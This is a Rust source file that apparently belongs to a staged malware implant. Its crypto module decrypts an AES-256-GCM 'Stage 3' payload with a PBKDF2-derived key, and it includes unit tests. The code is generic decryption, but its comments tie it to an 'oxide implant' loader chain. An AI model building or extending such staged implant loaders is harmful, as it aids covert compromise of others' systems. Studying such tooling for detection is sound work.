//! Crypto module - AES-256-GCM decryption compatible with oxide-shared.
//!
//! Stage 2 only needs decryption (to decrypt Stage 3).
//! Uses same PBKDF2 key derivation as oxide implant.

use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
use crate::constants::*;

#[derive(Debug, thiserror::Error)]
pub enum CryptoError {
    #[error("data too short for decryption")]
    TooShort,
    #[error("decryption failed")]
    DecryptFailed,
}

/// Decrypt data encrypted by oxide-shared CryptoContext.
///
/// Expected format: [nonce: 12 bytes][ciphertext + tag]
pub fn decrypt_payload(psk: &str, salt: &[u8], data: &[u8]) -> Result<Vec<u8>, CryptoError> {
    if data.len() < NONCE_SIZE + 16 {
        return Err(CryptoError::TooShort);
    }

    // Derive key using PBKDF2 (same as oxide-shared)
    let mut key = [0u8; AES_KEY_SIZE];
    pbkdf2::pbkdf2_hmac::<sha2::Sha256>(
        psk.as_bytes(),
        salt,
        PBKDF2_ITERATIONS,
        &mut key,
    );

    let cipher = Aes256Gcm::new_from_slice(&key)
        .expect("valid key size");

    let nonce = Nonce::from_slice(&data[..NONCE_SIZE]);
    let plaintext = cipher
        .decrypt(nonce, &data[NONCE_SIZE..])
        .map_err(|_| CryptoError::DecryptFailed)?;

    Ok(plaintext)
}

#[cfg(test)]
mod tests {
    use super::*;
    use aes_gcm::aead::generic_array::GenericArray;

    #[test]
    fn decrypt_known_vector() {
        // Test vector: encrypt "hello" with known key/salt
        let psk = "test-key";
        let salt = b"test-salt-must-be-32-bytes-long!";

        // Derive key
        let mut key = [0u8; AES_KEY_SIZE];
        pbkdf2::pbkdf2_hmac::<sha2::Sha256>(
            psk.as_bytes(),
            salt,
            PBKDF2_ITERATIONS,
            &mut key,
        );

        // Encrypt "hello" with known nonce
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
        let nonce_bytes = [0u8; 12];
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = cipher.encrypt(nonce, b"hello".as_ref()).unwrap();

        // Build payload: nonce + ciphertext
        let mut payload = Vec::new();
        payload.extend_from_slice(&nonce_bytes);
        payload.extend_from_slice(&ciphertext);

        // Decrypt and verify
        let plaintext = decrypt_payload(psk, salt, &payload).unwrap();
        assert_eq!(plaintext, b"hello");
    }

    #[test]
    fn decrypt_too_short() {
        let result = decrypt_payload("key", b"salt", &[0u8; 10]);
        assert!(matches!(result, Err(CryptoError::TooShort)));
    }
}
